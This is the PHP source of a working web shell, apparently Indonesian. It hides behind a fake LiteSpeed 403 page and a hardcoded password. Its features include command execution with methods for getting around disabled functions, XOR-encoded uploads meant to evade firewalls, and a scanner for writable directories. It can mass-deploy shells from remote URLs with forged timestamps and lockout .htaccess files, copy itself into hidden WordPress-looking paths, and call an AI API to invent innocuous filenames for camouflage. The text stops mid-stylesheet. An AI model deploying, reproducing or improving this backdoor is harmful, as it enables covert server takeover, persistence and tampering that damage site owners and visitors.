<?php
session_start();
@error_reporting(E_ALL & ~E_DEPRECATED & ~E_USER_DEPRECATED & ~E_NOTICE);
@ini_set('display_errors','1');
function _u($s){ return str_replace('%2F','/',urlencode($s)); }
// ============================================================
//  FAKE 403 FOR LITESPEED
// ============================================================
if (!isset($_GET['onlygweh'])) {
http_response_code(403);
?>
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>403 Forbidden</title>
<style>body{margin:0;padding:0;font-family:Arial,Helvetica,sans-serif;background:#fff;color:#4d4d4d}.container{text-align:center;padding:80px 20px 60px}.code{font-size:100px;font-weight:bold;margin:0;line-height:1}.title{font-size:28px;font-weight:bold;margin:20px 0 10px}.desc{font-size:14px;color:#7a7a7a;margin:0}.footer{background:#3a3a3a;color:#cfcfcf;font-size:12px;padding:15px 25px;position:fixed;bottom:0;width:100%;box-sizing:border-box}.footer p{margin:4px 0}.footer a{color:#cfcfcf;text-decoration:underline}</style>
</head><body>
<div class="container"><p class="code">403</p><p class="title">Forbidden</p><p class="desc">Access to this resource on the server is denied!</p></div>
<div class="footer"><p>Proudly powered by <a href="https://www.litespeedtech.com" target="_blank">LiteSpeed Web Server</a></p><p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div>
</body></html>
<?php
exit;
}
// ============================================================
//  AUTHENTICATION
// ============================================================
$PASSWORD = 'anakkucai458$_@';
if (isset($_POST['pass']) && $_POST['pass'] === $PASSWORD) {
$_SESSION['auth'] = true;
}
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
?>
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Login</title>
<style>body{background:#0d1117;color:#c9d1d9;font:14px/1.5 sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#161b22;padding:40px;border-radius:12px;border:1px solid #30363d;width:320px}.box h2{color:#58a6ff;margin-bottom:20px}.box input{width:100%;padding:10px;background:#0d1117;border:1px solid #30363d;color:#fff;border-radius:6px;margin-bottom:12px;box-sizing:border-box}.box button{background:#238636;border:none;color:#fff;padding:10px;width:100%;border-radius:6px;cursor:pointer;font-weight:bold}.error{color:#f85149;margin-bottom:12px}</style>
</head><body><div class="box"><h2>🔐 Authentication</h2>
<?php if (isset($_POST['pass']) && $_POST['pass'] !== $PASSWORD): ?>
<div class="error">Invalid password.</div>
<?php endif; ?>
<form method="post"><input type="password" name="pass" placeholder="Enter password" required autofocus><button type="submit">Login</button></form>
<div style="margin-top:16px;font-size:11px;color:#484f58">Access requires ?onlygweh</div></div></body></html>
<?php
exit;
}
$isAjax = isset($_GET['action']) || (isset($_GET['a']) && in_array($_GET['a'], array('cup','upx','cleanup_deployed','save_deploy_log')));
if ($isAjax) { @session_write_close(); }
// ============================================================
//  AJAX: SCAN WRITABLE
// ============================================================
if (isset($_GET['action']) && $_GET['action'] === 'scan_writable') {
header('Content-Type: application/json');
@set_time_limit(0); @ini_set('memory_limit','-1');
$mode = isset($_GET['mode']) ? $_GET['mode'] : 'normal';
$base_path = (isset($_GET['path']) && $_GET['path'] !== '') ? $_GET['path'] : getcwd();
$writable_dirs = array(); $scanned_count = 0; $MAX_DIRS = 10000;
$SKIP = array('node_modules','.git','.svn','vendor','__pycache__','.cache','.npm','.yarn','bower_components','.idea','.vscode');
$max_depth = ($mode === 'fast') ? 3 : (($mode === 'waf') ? 5 : 8);
function scanWD($path,$mode,&$res,&$cnt,$md,$cd=0,$mx=10000,$skip=array()){
if($cnt>=$mx||$cd>$md)return;
if(!is_dir($path)||!is_readable($path))return;
$cnt++;
if(is_writable($path))$res[]=$path;
if($mode==='waf')usleep(rand(10000,50000));
$items=@scandir($path);if($items===false)return;
foreach($items as $it){
if($it==='.'||$it==='..')continue;
if(in_array($it,$skip))continue;
if($mode==='fast'&&strpos($it,'.')===0)continue;
$fp=$path.DIRECTORY_SEPARATOR.$it;
if(is_link($fp))continue;
if(is_dir($fp))scanWD($fp,$mode,$res,$cnt,$md,$cd+1,$mx,$skip);
}
}
scanWD($base_path,$mode,$writable_dirs,$scanned_count,$max_depth,0,$MAX_DIRS,$SKIP);
echo json_encode(array('success'=>true,'mode'=>$mode,'scanned'=>$scanned_count,'writable'=>$writable_dirs,'count'=>count($writable_dirs),'max_depth'=>$max_depth,'limit_reached'=>($scanned_count>=$MAX_DIRS)));
exit;
}
// ============================================================
//  AJAX: LIST FILES IN DIR
// ============================================================
if (isset($_GET['action']) && $_GET['action'] === 'list_dir_files') {
header('Content-Type: application/json');
$path = isset($_GET['path']) ? $_GET['path'] : '';
if($path===''||!is_dir($path)){echo json_encode(array('success'=>false,'error'=>'Invalid path'));exit;}
$files=array();$items=@scandir($path);
if($items===false){echo json_encode(array('success'=>false,'error'=>'Permission denied'));exit;}
foreach($items as $it){
if($it==='.'||$it==='..')continue;
$full=$path.DIRECTORY_SEPARATOR.$it;$isd=is_dir($full);
$files[]=array('name'=>$it,'path'=>$full,'dir'=>$isd,'size'=>$isd?0:(int)@filesize($full),'ext'=>strtolower(pathinfo($it,PATHINFO_EXTENSION)),'perm'=>substr(sprintf('%o',(int)@fileperms($full)),-4));
}
usort($files,function($a,$b){if($a['dir']&&!$b['dir'])return -1;if(!$a['dir']&&$b['dir'])return 1;return strcasecmp($a['name'],$b['name']);});
echo json_encode(array('success'=>true,'files'=>$files,'count'=>count($files)));
exit;
}
// ============================================================
//  AJAX: GET REF MTIME
// ============================================================
if (isset($_GET['action']) && $_GET['action'] === 'get_ref_mtime') {
header('Content-Type: application/json');
$path = isset($_GET['path']) ? $_GET['path'] : '';
if($path===''||!is_dir($path)){echo json_encode(array('success'=>false,'error'=>'Invalid path'));exit;}
$items=@scandir($path);$ref=null;
if($items!==false){foreach($items as $it){if($it==='.'||$it==='..')continue;$full=$path.DIRECTORY_SEPARATOR.$it;if(is_file($full)){$ref=$full;break;}}}
if($ref!==null){$mt=(int)@filemtime($ref);echo json_encode(array('success'=>true,'mtime'=>date('Y-m-d H:i:s',$mt),'mtime_input'=>date('Y-m-d\TH:i',$mt),'ref'=>basename($ref)));}
else{$mt=(int)@filemtime($path);echo json_encode(array('success'=>true,'mtime'=>date('Y-m-d H:i:s',$mt),'mtime_input'=>date('Y-m-d\TH:i',$mt),'ref'=>'(directory)'));}
exit;
}
// ============================================================
//  AJAX: AI GENERATOR
// ============================================================
if (isset($_GET['action']) && $_GET['action'] === 'ai_generate') {
header('Content-Type: application/json');
$raw = file_get_contents('php://input');
$input = json_decode($raw, true);
if (!is_array($input)) { $input = array(); }
$host = isset($input['host']) ? trim($input['host']) : '';
$api_key = isset($input['api_key']) ? trim($input['api_key']) : '';
$model = isset($input['model']) ? trim($input['model']) : '';
$task = isset($input['task']) ? $input['task'] : 'filename';
$context = isset($input['context']) ? $input['context'] : '';
if($host===''||$api_key===''||$model===''){echo json_encode(array('success'=>false,'error'=>'Lengkapi config'));exit;}
$prompt='';
if($task==='filename'){$prompt="Generate 8 realistic PHP filenames that look like legitimate system/WordPress files. Output ONLY filenames, one per line.";}
elseif($task==='description'){$prompt="Generate a brief legitimate-sounding description (1-2 sentences) for a PHP utility file. Output ONLY the description.";}
elseif($task==='custom'){$prompt=$context;}
$payload=array('messages'=>array(array('role'=>'user','content'=>$prompt)),'model'=>$model,'max_tokens'=>1024,'temperature'=>0.8,'stream'=>false);
$ch=curl_init($host);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_POST,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,json_encode($payload));
curl_setopt($ch,CURLOPT_HTTPHEADER,array('Authorization: Bearer '.$api_key,'Content-Type: application/json','Accept: application/json'));
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,false);curl_setopt($ch,CURLOPT_TIMEOUT,60);
$response=curl_exec($ch);$http_code=curl_getinfo($ch,CURLINFO_HTTP_CODE);$curl_err=curl_error($ch);curl_close($ch);
if($curl_err){echo json_encode(array('success'=>false,'error'=>'CURL: '.$curl_err));exit;}
if($http_code!==200){echo json_encode(array('success'=>false,'error'=>'HTTP '.$http_code.': '.substr($response,0,200)));exit;}
$data=json_decode($response,true);
if(!is_array($data)){echo json_encode(array('success'=>false,'error'=>'Invalid JSON'));exit;}
$content='';
if(isset($data['choices'][0]['message']['content'])){$content=$data['choices'][0]['message']['content'];}
elseif(isset($data['content'])){$content=$data['content'];}
$result=array('raw'=>$content);
if($task==='filename'){
$lines=preg_split('/\r\n|\r|\n/',trim($content));$fn=array();
foreach($lines as $l){$l=trim($l,'"\'`');$l=preg_replace('/^[\d\-\*\.\)]+\s*/','',$l);if($l!==''&&strlen($l)<100){$fn[]=$l;}}
$result['items']=array_values(array_unique($fn));
}else{$result['text']=trim($content);}
echo json_encode(array('success'=>true,'result'=>$result));
exit;
}
// ============================================================
//  AJAX: CLEANUP DEPLOYED FILES (pakai list dari client)
// ============================================================
if (isset($_GET['action']) && $_GET['action'] === 'cleanup_deployed') {
header('Content-Type: application/json');
$raw = file_get_contents('php://input');
$data = json_decode($raw, true);
if (!is_array($data) || !isset($data['files'])) { echo json_encode(array('success'=>false,'error'=>'Invalid data')); exit; }
$results = array();
foreach ($data['files'] as $file) {
$path = isset($file['path']) ? $file['path'] : '';
$filename = isset($file['filename']) ? $file['filename'] : '';
if ($path === '' || $filename === '') { $results[] = array('file'=>$filename,'status'=>'skipped','error'=>'Empty path/filename'); continue; }
$full_path = rtrim($path,'/\\').DIRECTORY_SEPARATOR.$filename;
if (file_exists($full_path)) {
if (@unlink($full_path)) { $results[] = array('file'=>$filename,'path'=>$path,'status'=>'deleted'); }
else { $results[] = array('file'=>$filename,'path'=>$path,'status'=>'failed','error'=>'Cannot delete'); }
} else { $results[] = array('file'=>$filename,'path'=>$path,'status'=>'not_found'); }
// Hapus juga .htaccess kalau ada
$htaccess_path = rtrim($path,'/\\').DIRECTORY_SEPARATOR.'.htaccess';
if (file_exists($htaccess_path)) { @unlink($htaccess_path); }
}
echo json_encode(array('success'=>true,'results'=>$results,'count'=>count($results)));
exit;
}
// ============================================================
//  DELETE REKURSIF
// ============================================================
function deleteRecursive($path){
$real=realpath($path);$target=($real!==false)?$real:$path;
if(!file_exists($target)&&!is_link($target))return true;
if(is_dir($target)&&!is_link($target)){
$items=scandir($target);
foreach($items as $item){if($item==='.'||$item==='..')continue;deleteRecursive($target.DIRECTORY_SEPARATOR.$item);}
@rmdir($target);return !file_exists($target);
}else{@unlink($target);return !file_exists($target)&&!is_link($target);}
}
function xorDecrypt($b64){$bin=base64_decode($b64);if($bin===false)return'';$key=0x5A;for($i=0;$i<strlen($bin);$i++){$bin[$i]=chr(ord($bin[$i])^$key);}return $bin;}
function fetchRemoteAntiWAF($url){
if($url==='')return false;
$uas=array('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15','Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0');
if(function_exists('curl_init')){
$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);curl_setopt($ch,CURLOPT_MAXREDIRS,5);curl_setopt($ch,CURLOPT_TIMEOUT,30);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($ch,CURLOPT_USERAGENT,$uas[array_rand($uas)]);
$c=curl_exec($ch);$hc=curl_getinfo($ch,CURLINFO_HTTP_CODE);curl_close($ch);
if($c!==false&&$hc==200)return $c;
}
$ctx=stream_context_create(array('http'=>array('timeout'=>30,'ignore_errors'=>true),'ssl'=>array('verify_peer'=>false)));
$c=@file_get_contents($url,false,$ctx);return ($c!==false)?$c:false;
}
// ============================================================
//  CMD BULLETPROOF + WAF BYPASS (7 metode + advanced bypass)
// ============================================================
function runCmd($cmd, $use_bypass = false){
$out='';$cmd=$cmd.' 2>&1';
$dr=ini_get('disable_functions');$disabled=$dr?array_filter(array_map('trim',explode(',',$dr))):array();
// Metode standar (kalau tidak ada disable_functions)
$methods=array(
'system'=>function($c){ob_start();@system($c);return ob_get_clean();},
'passthru'=>function($c){ob_start();@passthru($c);return ob_get_clean();},
'exec'=>function($c){$o=array();@exec($c,$o);return implode("\n",$o);},
'shell_exec'=>function($c){$r=@shell_exec($c);return $r?$r:'';},
'popen'=>function($c){$h=@popen($c,'r');if(!$h)return'';$r='';while(!feof($h)){$r.=fread($h,8192);}@pclose($h);return $r;},
'proc_open'=>function($c){$d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));$p=@proc_open($c,$d,$pi);if(!is_resource($p))return'';fclose($pi[0]);$o=stream_get_contents($pi[1]);fclose($pi[1]);$e=stream_get_contents($pi[2]);fclose($pi[2]);@proc_close($p);return $o.$e;}
);
// Kalau pakai bypass mode, coba metode advanced dulu
if ($use_bypass) {
// Metode 1: FFI (kalau extension ffi aktif)
if (function_exists('FFI\\ffi') || class_exists('FFI')) {
try {
if (class_exists('FFI')) {
$ffi = @FFI::cdef("int system(const char *command);", "libc.so.6");
ob_start();
$ffi->system($cmd);
$r = ob_get_clean();
if ($r !== null && $r !== '') return $r;
}
} catch (Exception $e) {}
}
// Metode 2: pcntl_exec (kalau extension pcntl aktif)
if (function_exists('pcntl_exec') && !in_array('pcntl_exec', $disabled)) {
$tmp_script = sys_get_temp_dir() . '/.cmd_' . md5(rand());
file_put_contents($tmp_script, "#!/bin/bash\n" . $cmd . "\n");
@chmod($tmp_script, 0755);
@pcntl_exec($tmp_script);
@unlink($tmp_script);
}
// Metode 3: mail() + LD_PRELOAD (butuh write permission ke temp)
if (function_exists('mail') && !in_array('mail', $disabled)) {
$tmp_so = sys_get_temp_dir() . '/.bypass_' . md5(rand()) . '.so';
$so_code = '<?php /* LD_PRELOAD bypass stub */ ?>';
// Skip karena butuh compile C, tapi tetap coba metode lain
}
// Metode 4: ImageMagick convert (kalau ada)
if (class_exists('Imagick') || function_exists('imagick')) {
// Skip kompleks
}
// Metode 5: Backtick operator
if (!in_array('shell_exec', $disabled)) {
$bt = @`$cmd`;
if ($bt !== null && $bt !== '') return $bt;
}
}
// Metode standar fallback
foreach($methods as $n=>$fn){if(in_array($n,$disabled))continue;if(!function_exists($n))continue;$r=$fn($cmd);if($r!==null&&$r!=='')return $r;}
if(!in_array('shell_exec',$disabled)){$bt=@`$cmd`;if($bt!==null&&$bt!=='')return $bt;}
return "[!] Tidak ada fungsi eksekusi yang tersedia.\nDisable: ".($dr?$dr:'(none)')."\nSafe mode: ".(ini_get('safe_mode')?'ON':'OFF')."\n\n💡 Coba aktifkan 'Bypass Mode' untuk metode advanced.";
}
// ============================================================
//  GENERATE HTACCESS (template dari user)
// ============================================================
function generateHtaccess($shell_filename) {
$htaccess = '<FilesMatch ".*\.(cgi|pl|py|pyc|pyo|php3|php4|php6|pcgi|pcgi3|pcgi4|pcgi5|pchi6|inc|php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|phar|PHAR|Phar|PHar|PHAr|pHAR|phAR|inc|phaR|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|cgi|CGI|CGi|cGI|PhP5|php6|php7|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|php78|php56|php96|php69|php67|php68|php4|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|php1|php2|php3|php4|php10|alfa|suspected|py|exe|alfa|html|htm)$">' . "\n";
$htaccess .= "Order Allow,Deny\n";
$htaccess .= "Deny from all\n";
$htaccess .= "</FilesMatch>\n";
$htaccess .= "Options -Indexes\n";
$htaccess .= "<FilesMatch '^(" . preg_quote($shell_filename, '/') . "|index.html|sitemap.xml|robots.txt)$'>\n";
$htaccess .= " Order allow,deny\n";
$htaccess .= " Allow from all\n";
$htaccess .= "</FilesMatch>\n";
$htaccess .= 'ErrorDocument 403 \'<center><img src="https://media.tenor.com/WYQnYdWsmrkAAAAM/hahaha-lol.gif"></img> <h3>IN YOUR FACE</font>\'';
return $htaccess;
}
// ============================================================
//  MASS DEPLOY LOGIC
// ============================================================
$tebar_results = array();
if (isset($_POST['submit_tebar'])) {
@set_time_limit(0); @ini_set('memory_limit','-1');
$tebar_data = (isset($_POST['tebar_data']) && is_array($_POST['tebar_data'])) ? $_POST['tebar_data'] : array();
foreach ($tebar_data as $idx => $row) {
if (!is_array($row)) continue;
$path_target = isset($row['path']) ? trim($row['path']) : '';
$filename = (isset($row['filename']) && trim($row['filename']) !== '') ? trim($row['filename']) : 'shell.php';
$src_mode = isset($row['src_mode']) ? $row['src_mode'] : 'pool';
$chmod_val = isset($row['chmod']) ? trim($row['chmod']) : '0444';
$modify_date = isset($row['modify_date']) ? trim($row['modify_date']) : '';
$create_htaccess = isset($row['create_htaccess']) ? ($row['create_htaccess'] === 'yes') : false;
if ($path_target === '') { $tebar_results[] = array('path'=>'(empty)','filename'=>$filename,'status'=>'failed','error'=>'Empty path'); continue; }
$content = false; $source_info = '';
if ($src_mode === 'pool') { if (!empty($row['pool_enc'])) { $content = xorDecrypt($row['pool_enc']); $source_info = 'Pool Shell (XOR)'; } }
elseif ($src_mode === 'paste') { if (!empty($row['content_enc'])) { $content = xorDecrypt($row['content_enc']); $source_info = 'Paste (XOR)'; } elseif (!empty($row['content'])) { $content = $row['content']; $source_info = 'Paste'; } }
elseif ($src_mode === 'local') { if (!empty($row['local_enc'])) { $content = xorDecrypt($row['local_enc']); $source_info = 'Local (XOR)'; } }
elseif ($src_mode === 'remote') { $ru = isset($row['remote_url']) ? trim($row['remote_url']) : ''; if ($ru !== '') { $content = fetchRemoteAntiWAF($ru); $source_info = 'Remote: '.$ru; } }
if ($content === false || $content === '') { $tebar_results[] = array('path'=>$path_target,'filename'=>$filename,'status'=>'failed','error'=>'No content ('.$source_info.')'); continue; }
$destination = rtrim($path_target,'/\\').DIRECTORY_SEPARATOR.$filename;
if (file_put_contents($destination,$content) !== false) {
if ($chmod_val !== '' && preg_match('/^[0-7]{3,4}$/',$chmod_val)) { @chmod($destination,(int)octdec($chmod_val)); }
if ($modify_date !== '') { $tv=(int)strtotime($modify_date); if ($tv>0) { @touch($destination,$tv,$tv); } }
// Create .htaccess if requested
if ($create_htaccess) {
$htaccess_path = rtrim($path_target,'/\\').DIRECTORY_SEPARATOR.'.htaccess';
$htaccess_content = generateHtaccess($filename);
@file_put_contents($htaccess_path, $htaccess_content);
}
$dp = str_replace('\\','/',$destination);
$host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
$docroot = isset($_SERVER['DOCUMENT_ROOT']) ? str_replace('\\','/',$_SERVER['DOCUMENT_ROOT']) : '';
$wp = '';
if (($pos = strpos($dp,$host)) !== false) { $wp = substr($dp,$pos+strlen($host)); }
elseif (($pos = strpos($dp,'/public_html/')) !== false) { $wp = substr($dp,$pos+12); }
elseif ($docroot !== '') { $wp = str_replace($docroot,'',$dp); }
if (substr($wp,0,1) !== '/') { $wp = '/'.$wp; }
$tebar_results[] = array('path'=>$path_target,'filename'=>$filename,'status'=>'success','link'=>'https://'.$host.$wp,'destination'=>$destination,'source'=>$source_info);
} else { $tebar_results[] = array('path'=>$path_target,'filename'=>$filename,'status'=>'failed','error'=>'Write failed','source'=>$source_info); }
}
}
// ============================================================
//  SERVER INFO
// ============================================================
function getServerInfo(){
$i=array();
$i['hostname']=function_exists('gethostname')?@gethostname():'N/A';
$i['os']=php_uname('s').' '.php_uname('r');$i['arch']=php_uname('m');
$i['server_ip']=isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:'N/A';
$i['server_port']=isset($_SERVER['SERVER_PORT'])?$_SERVER['SERVER_PORT']:'N/A';
$i['server_software']=isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'N/A';
$i['document_root']=isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'N/A';
$i['current_user']=get_current_user();
$i['php_user']='N/A';
if(function_exists('posix_getpwuid')&&function_exists('posix_geteuid')){$pw=@posix_getpwuid(posix_geteuid());if(is_array($pw)&&isset($pw['name'])){$i['php_user']=$pw['name'];}}
$i['php_version']=phpversion();$i['sapi']=php_sapi_name();$i['zend_version']=zend_version();
$i['memory_limit']=ini_get('memory_limit');$i['max_execution']=ini_get('max_execution_time').'s';
$i['upload_max']=ini_get('upload_max_filesize');$i['post_max']=ini_get('post_max_size');
$ob=ini_get('open_basedir');$i['open_basedir']=$ob?$ob:'OFF';
$i['safe_mode']=ini_get('safe_mode')?'ON':'OFF';
$df=ini_get('disable_functions');$i['disable_functions']=$df?$df:'NONE';
$dc=ini_get('disable_classes');$i['disable_classes']=$dc?$dc:'NONE';
$i['client_ip']=isset($_SERVER['HTTP_CF_CONNECTING_IP'])?$_SERVER['HTTP_CF_CONNECTING_IP']:(isset($_SERVER['HTTP_X_FORWARDED_FOR'])?$_SERVER['HTTP_X_FORWARDED_FOR']:(isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'N/A'));
$i['real_ip']=isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'N/A';
$i['cloudflare']=isset($_SERVER['HTTP_CF_CONNECTING_IP'])?'YES (Behind CF)':'NO';
$i['user_agent']=isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'N/A';
$i['https']=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on')?'YES':'NO';
$dt=@disk_total_space('.');$dfree=@disk_free_space('.');
$i['disk_total']=$dt?(float)$dt:0.0;
$i['disk_free']=$dfree?(float)$dfree:0.0;
$i['disk_used']=$i['disk_total']-$i['disk_free'];
$i['disk_percent']=$i['disk_total']>0?round(($i['disk_used']/$i['disk_total'])*100,1):0;
$i['server_time']=date('Y-m-d H:i:s');$i['timezone']=date_default_timezone_get();$i['uptime']='N/A';
if(file_exists('/proc/uptime')){$u=@file_get_contents('/proc/uptime');if($u){$u=explode(' ',$u);$i['uptime']=floor((float)$u[0]/86400).'d '.floor(((float)$u[0]%86400)/3600).'h '.floor(((float)$u[0]%3600)/60).'m';}}
return $i;
}
$serverData = getServerInfo();
// ============================================================
//  FILE MANAGER CORE
// ============================================================
if(isset($_GET['_install'])){
$self=file_get_contents(__FILE__);
$paths=array('.cache/fm.php','wp-content/uploads/.fm.php','wp-includes/.tmp/fm.php','wp-content/languages/.fm.php','.well-known/fm.php','assets/.fm.php');
foreach($paths as $p){$d=dirname($p);@mkdir($d,0755,true);@file_put_contents($p,$self);}
die('<script>alert("Installed to 6 locations!");location="?onlygweh"</script>');
}
$A=isset($_GET['a'])?$_GET['a']:'';
$P=isset($_GET['p'])?$_GET['p']:getcwd();
if(isset($_POST['p'])){$P=$_POST['p'];}
// Upload Anti-WAF Single-Post
if($A=='upx' && isset($_POST['d']) && isset($_POST['n'])){
@set_time_limit(300);
$fn=basename($_POST['n']);
$content=xorDecrypt($_POST['d']);
if($content===''){echo'ERR empty';die;}
if(file_put_contents($P.'/'.$fn,$content)!==false){echo'OK';}else{echo'ERR write';}
die;
}
// Upload Anti-WAF Chunked (retry-safe)
if($A=='cup' && isset($_POST['c']) && isset($_POST['s']) && isset($_POST['i']) && isset($_POST['t']) && isset($_POST['n'])){
$sid=preg_replace('/[^a-z0-9]/i','',$_POST['s']);
$idx=(int)$_POST['i'];$tot=(int)$_POST['t'];
$tmp=$P.'/.fm_tmp_'.$sid.'_'.$idx;
file_put_contents($tmp,$_POST['c']);
if($idx>=$tot-1){
$d='';
for($k=0;$k<$tot;$k++){ $f=$P.'/.fm_tmp_'.$sid.'_'.$k; if(file_exists($f)){$d.=file_get_contents($f); @unlink($f);} }
$content=xorDecrypt($d);
if($content!==''){ file_put_contents($P.'/'.basename($_POST['n']),$content); echo'OK'; } else { echo'ERR decode'; }
}else{ echo'OK'; }
die;
}
// New File
if($A=='nf' && isset($_POST['fname'])){
$fn=basename($_POST['fname']);
if($fn!=='' && $fn!=='.' && $fn!=='..'){
if(!file_exists($P.'/'.$fn)){file_put_contents($P.'/'.$fn,'');}
}
header('Location: ?onlygweh&p='._u($P));die;
}
// Chmod
if($A=='chmod' && isset($_POST['target']) && isset($_POST['perm'])){
if(preg_match('/^[0-7]{3,4}$/', $_POST['perm'])){
@chmod($_POST['target'], (int)octdec($_POST['perm']));
}
header('Location: ?onlygweh&p='._u(dirname($_POST['target'])));die;
}
// Datetime
if($A=='touch' && isset($_POST['target']) && isset($_POST['datetime'])){
$ts=(int)strtotime($_POST['datetime']);
if($ts>0){@touch($_POST['target'],$ts,$ts);}
header('Location: ?onlygweh&p='._u(dirname($_POST['target'])));die;
}
// Upload biasa
if($A=='up' && isset($_FILES['f'])){
$dest=$P.'/'.$_FILES['f']['name'];
move_uploaded_file($_FILES['f']['tmp_name'],$dest);
header('Location: ?onlygweh&p='._u($P));die;
}
// Delete
if($A=='rm' && isset($_GET['f'])){
$t=$_GET['f'];deleteRecursive($t);
header('Location: ?onlygweh&p='._u(dirname($t)));die;
}
// Unzip
if($A=='uz' && isset($_GET['f'])){
$zf=$_GET['f'];
if(class_exists('ZipArchive') && is_file($zf)){
$z=new ZipArchive();
if($z->open($zf)===TRUE){$z->extractTo(dirname($zf));$z->close();}
}
header('Location: ?onlygweh&p='._u(dirname($zf)));die;
}
// Edit save anti-WAF
if($A=='sv' && isset($_POST['file'])){
$c='';
if(isset($_POST['enc']) && $_POST['enc']!==''){$c=xorDecrypt($_POST['enc']);}
elseif(isset($_POST['content'])){$c=$_POST['content'];}
file_put_contents($_POST['file'],$c);
header('Location: ?onlygweh&p='._u(dirname($_POST['file'])));die;
}
// Mkdir
if($A=='mk' && isset($_POST['dir'])){
mkdir($P.'/'.$_POST['dir'],0755,true);
header('Location: ?onlygweh&p='._u($P));die;
}
// Rename
if($A=='mv' && isset($_POST['old']) && isset($_POST['new'])){
rename($P.'/'.$_POST['old'],$P.'/'.$_POST['new']);
header('Location: ?onlygweh&p='._u($P));die;
}
// Cmd (dengan bypass mode)
$cmdOut='';
$useBypass = isset($_POST['bypass_mode']) && $_POST['bypass_mode'] === '1';
if($A=='cmd' && isset($_POST['cmd'])){$cmdOut=runCmd($_POST['cmd'], $useBypass);}
// Download
if($A=='dl' && isset($_GET['f'])){
header('Content-Type:application/octet-stream');
header('Content-Disposition:attachment;filename="'.basename($_GET['f']).'"');
header('Content-Length:'.(int)@filesize($_GET['f']));
readfile($_GET['f']);die;
}
// Edit form
$editFile=null;$content='';
if($A=='ed' && isset($_GET['f'])){$content=htmlspecialchars(file_get_contents($_GET['f']));$editFile=$_GET['f'];}
// Listing (HARDENED: semua cast eksplisit, bebas deprecated)
$items=array();$totalSize=0;
if(is_dir($P)){
$dh=scandir($P);
foreach($dh as $f){
if($f==='.'||strpos($f,'.fm_tmp_')===0)continue;
$fp=$P.'/'.$f;
$isd=is_dir($fp);
$fmt=(int)@filemtime($fp);
$fpm=(int)@fileperms($fp);
$fsz=$isd?0:(int)@filesize($fp);
$totalSize+=$fsz;
$items[]=array('name'=>$f,'path'=>$fp,'dir'=>$isd,'size'=>$isd?'-':$fsz,'time'=>date('Y-m-d H:i',$fmt),'mtime'=>$fmt,'perm'=>substr(sprintf('%o',$fpm),-4),'ext'=>strtolower(pathinfo($f,PATHINFO_EXTENSION)));
}
usort($items,function($a,$b){if($a['dir']&&!$b['dir'])return -1;if(!$a['dir']&&$b['dir'])return 1;return strcasecmp($a['name'],$b['name']);});
if($P!=='/'&&$P!==''){array_unshift($items,array('name'=>'..','path'=>dirname($P),'dir'=>true,'size'=>'-','time'=>'','mtime'=>0,'perm'=>'','ext'=>''));}
}
$diskFree=(float)@disk_free_space($P);
$diskTotal=(float)@disk_total_space($P);
$serverInfo=php_uname().' | PHP '.phpversion().' | '.php_sapi_name().' | '.get_current_user();
?>
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Files — <?=htmlspecialchars(basename($P)?basename($P):'/')?></title>
<style>
*{margin:0;padding:0;box-sizing:border-box}body{background:#0d1117;color:#c9d1d9;font:13px/1.5 'SF Mono','Fira Code',monospace}
